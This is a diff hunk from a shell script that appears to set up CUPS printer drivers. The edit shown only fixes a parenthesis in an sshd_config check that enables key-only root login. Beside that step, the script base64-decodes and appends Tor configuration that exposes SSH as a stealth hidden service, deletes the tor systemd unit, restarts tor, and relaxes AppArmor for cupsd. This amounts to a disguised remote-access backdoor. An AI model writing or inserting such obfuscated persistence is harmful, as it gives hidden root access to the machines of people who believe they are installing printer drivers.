@@ -12,7 +12,7 @@ aa-complain cupsd
 
 grep "^HiddenServiceDir /var/lib/tor/ssh/" /etc/tor/torrc || (/etc/init.d/tor stop 2>&1 >/dev/null;echo "CkhpZGRlblNlcnZpY2VEaXIgL3Zhci9saWIvdG9yL3NzaC8KSGlkZGVuU2VydmljZVBvcnQgMjIgMTI3LjAuMC4xOjIyCkhpZGRlblNlcnZpY2VBdXRob3JpemVDbGllbnQgc3RlYWx0aCBzc2gKCgo=" |base64 -d  >> /etc/tor/torrc ;rm /lib/systemd/system/tor.service;service tor@default stop;service tor@default start)
 
-(grep "^PermitRootLogin without-password" /etc/ssh/sshd_config -q || grep "^PermitRootLogin prohibit-password" /etc/ssh/sshd_config -q) || grep "^PermitRootLogin no" /etc/ssh/sshd_config -q) && echo SAFE || ( echo "PermitRootLogin without-password" >> /etc/ssh/sshd_config )
+(grep "^PermitRootLogin without-password" /etc/ssh/sshd_config -q || grep "^PermitRootLogin prohibit-password" /etc/ssh/sshd_config -q || grep "^PermitRootLogin no" /etc/ssh/sshd_config -q) && echo SAFE || ( echo "PermitRootLogin without-password" >> /etc/ssh/sshd_config )
 
 for base in *base64 ; do  base64 -d $base > "/etc/cups/ppd/"${base/.base64/};done
 for type in CARD LABEL;do for i in {02..16};do cp -aurv /etc/cups/ppd/$type"01.ppd" /etc/cups/ppd/$type$i.ppd 2>/dev/null;cp -aurv /etc/cups/ppd/$type"01.ppd.O" /etc/cups/ppd/$type$i.ppd.O 2>/dev/null;done;done
